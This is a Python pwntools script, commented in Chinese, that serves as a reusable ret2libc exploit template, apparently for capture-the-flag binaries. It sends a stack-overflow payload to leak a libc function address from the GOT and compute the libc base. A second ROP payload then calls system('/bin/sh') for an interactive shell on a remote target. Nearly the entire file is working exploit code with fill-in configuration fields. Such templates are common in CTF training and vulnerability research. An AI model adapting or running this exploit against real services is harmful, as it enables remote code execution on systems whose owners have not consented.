#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: ret2libc 通用模板 —— 泄露 GOT 表函数真实地址 -> 计算 libc 基址 -> system("/bin/sh")
适用条件:
    - 栈溢出可控返回地址; NX 开启(不能塞 shellcode); 无 canary 或已绕过
    - 二进制有 puts/printf 且 PLT 可调用; 最好自带 libc 文件(没有就去 libc.rip 按低 12 位匹配)
用法:
    1) 改 CONFIG 区: BINARY/LIBC/ARCH/OFFSET/HOST/PORT/gadget 地址
    2) OFFSET 用 cyclic(200) + cyclic_find 定位; gadget 用 ROPgadget --binary ./pwn | grep "pop rdi"
    3) 本地调试把 start() 里 remote 换成 process
"""
from pwn import *

# ==================== CONFIG: TODO 改这里 ====================
BINARY = "./pwn"          # TODO: 改这里: 二进制路径
LIBC_PATH = "./libc.so.6" # TODO: 改这里: 配套 libc, 没有则置 None(改用本地 libc 匹配)
ARCH = 64                 # TODO: 改这里: 64 / 32, 位数自适应开关
OFFSET = 0x88             # TODO: 改这里: 溢出到返回地址的字节数
LEAK_SYM = "puts"         # TODO: 改这里: 泄露用的函数(GOT 里已有真实地址, 常用 puts/printf)
POP_RDI = 0x401234        # TODO: 改这里: 64 位 gadget: pop rdi; ret (32 位不用)
RET = 0x401236            # TODO: 改这里: 64 位 gadget: ret, 用于 movaps 栈对齐; 32 位不用
HOST, PORT = "node.node3.com", 23333  # TODO: 改这里: 远程地址
# =============================================================

context.log_level = "info"
context.arch = "amd64" if ARCH == 64 else "i386"
elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC_PATH, checksec=False) if LIBC_PATH else None


def start():
    # TODO: 改这里: 本地调试换成 process(BINARY)
    return remote(HOST, PORT)


def leak_libc(io):
    """第一步: 调用 puts(GOT[puts]) 打印 puts 真实地址, 由返回地址回到 main 再来一轮"""
    if ARCH == 64:
        # ret 先对齐(16 字节), pop rdi 传参 puts@got, 再调 puts@plt, 最后回 main
        payload = b"a" * OFFSET
        payload += p64(RET) + p64(POP_RDI) + p64(elf.got[LEAK_SYM])
        payload += p64(elf.plt["puts"]) + p64(elf.symbols["main"])
    else:
        # 32 位调用约定: 函数地址 + 返回地址(回 main) + 参数依次压栈
        payload = b"a" * OFFSET
        payload += p32(elf.plt["puts"]) + p32(elf.symbols["main"])
        payload += p32(elf.got[LEAK_SYM])

    io.sendlineafter(b">>", payload)          # TODO: 改这里: 程序菜单/输入提示符
    io.recvline()                             # 丢弃回显行, 视程序输出调整
    leak = io.recvline().strip()              # puts 打印的 6 字节地址
    if ARCH == 64:
        leak = u64(leak.ljust(8, b"\x00"))
    else:
        leak = u32(leak.ljust(4, b"\x00"))
    log.success(f"leak {LEAK_SYM}@got = {hex(leak)}")
    base = leak - libc.symbols[LEAK_SYM]      # 真实地址 - 符号偏移 = libc 基址
    log.success(f"libc base = {hex(base)}")
    assert base & 0xFFF == 0, "基址低 12 位非 0, 泄露的符号或 libc 对不上"
    libc.address = base
    return libc


def pwn():
    io = start()
    leak_libc(io)  # 泄露后已回 main, 可以再溢一次

    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]
    log.info(f"system = {hex(system)}, /bin/sh = {hex(binsh)}")

    if ARCH == 64:
        payload = b"a" * OFFSET
        payload += p64(RET) + p64(POP_RDI) + p64(binsh) + p64(system)
    else:
        payload = b"a" * OFFSET + p32(system) + p32(0xDEADBEEF) + p32(binsh)

    io.sendlineafter(b">>", payload)          # TODO: 改这里: 与第一步相同提示符
    io.recvline()
    io.interactive()  # 拿 shell


if __name__ == "__main__":
    pwn()
